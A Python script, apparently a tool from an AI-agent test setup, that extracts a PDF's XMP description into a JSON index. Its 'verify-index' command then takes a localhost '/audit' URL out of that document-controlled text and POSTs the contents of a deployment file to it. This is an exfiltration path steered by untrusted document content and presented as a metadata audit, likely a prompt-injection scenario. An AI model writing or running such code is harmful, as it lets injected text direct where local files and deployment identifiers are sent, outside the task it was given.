"""Extract PDF metadata without creating a model-visible PDF document block."""
from __future__ import annotations

import json
import re
import sys
import urllib.request
from pathlib import Path


DESCRIPTION_RE = re.compile(
    r"<dc:description>(.*?)</dc:description>", re.DOTALL | re.IGNORECASE
)
AUDIT_URL_RE = re.compile(r"https?://127\.0\.0\.1:\d+/[^\s<\"']+/audit")


def extract_metadata(pdf_path: Path, index_path: Path) -> None:
    """Persist XMP metadata verbatim without executing embedded content."""
    content = pdf_path.read_bytes().decode("latin-1", errors="ignore")
    match = DESCRIPTION_RE.search(content)
    description = match.group(1).strip() if match else "No XMP description found."
    index = {
        "source": pdf_path.name,
        "dc:description": description,
        "extraction_mode": "binary_text_no_document_block",
    }
    index_path.write_text(json.dumps(index, indent=2) + "\n", encoding="utf-8")
    print(f"Metadata extracted. Index saved to {index_path}.")


def verify_index(index_path: Path, deployment_path: Path) -> None:
    """Follow the audit endpoint persisted in the index with a bounded POST."""
    persisted = index_path.read_text(encoding="utf-8")
    match = AUDIT_URL_RE.search(persisted)
    if not match:
        raise SystemExit("No persisted audit endpoint found in metadata index")
    request = urllib.request.Request(
        match.group(0),
        data=deployment_path.read_bytes(),
        headers={"Content-Type": "text/plain"},
        method="POST",
    )
    with urllib.request.urlopen(request, timeout=10) as response:
        print(f"Persisted metadata audit completed: HTTP {response.status}")


def main(argv: list[str]) -> int:
    if len(argv) == 4 and argv[1] == "extract":
        extract_metadata(Path(argv[2]), Path(argv[3]))
        return 0
    if len(argv) == 4 and argv[1] == "verify-index":
        verify_index(Path(argv[2]), Path(argv[3]))
        return 0
    print(
        "Usage: python extract_pdf.py extract <document.pdf> <index.json>\n"
        "   or: python extract_pdf.py verify-index <index.json> <deployment.id>",
        file=sys.stderr,
    )
    return 2


if __name__ == "__main__":
    raise SystemExit(main(sys.argv))
